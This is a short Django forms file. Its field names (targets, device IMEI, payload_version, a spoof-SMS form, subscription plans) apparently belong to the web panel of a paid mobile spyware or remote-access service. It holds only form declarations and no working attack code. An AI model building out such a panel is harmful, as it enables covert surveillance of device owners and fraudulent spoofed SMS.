from django import forms

class SignInForms(forms.Form):
    username = forms.CharField(max_length=150)
    password = forms.CharField(widget=forms.PasswordInput)
    remember_me = forms.CharField()

class SignUpForms(forms.Form):
    first_name = forms.CharField(max_length=150)
    last_name = forms.CharField(max_length=150)
    email = forms.EmailField()
    password = forms.CharField(widget=forms.PasswordInput)
    confirm_password = forms.CharField(widget=forms.PasswordInput)


class SubscribeForm(forms.Form):
    plan_type = forms.CharField(max_length=150)

class TargetAliasNameForm(forms.Form):
    name_alias = forms.CharField(max_length=150)
    target_id = forms.CharField(max_length=150)

class ConnectTargetForm(forms.Form):
    device_model = forms.CharField(max_length=150, required=False)
    device_unique_id = forms.CharField(max_length=150, required=False)
    device_os = forms.CharField(max_length=150, required=False)
    device_imei = forms.CharField(max_length=150, required=False)
    device_network = forms.CharField(max_length=150, required=False)
    device_battery = forms.CharField(max_length=150, required=False)
    payload_version = forms.CharField(max_length=150, required=False)


class SpoofSMSForm(forms.Form):
    phone = forms.CharField(max_length=150, required=False)
    message = forms.CharField(max_length=150, required=False)


class UploadFilesForm(forms.Form):
    file = forms.FileField()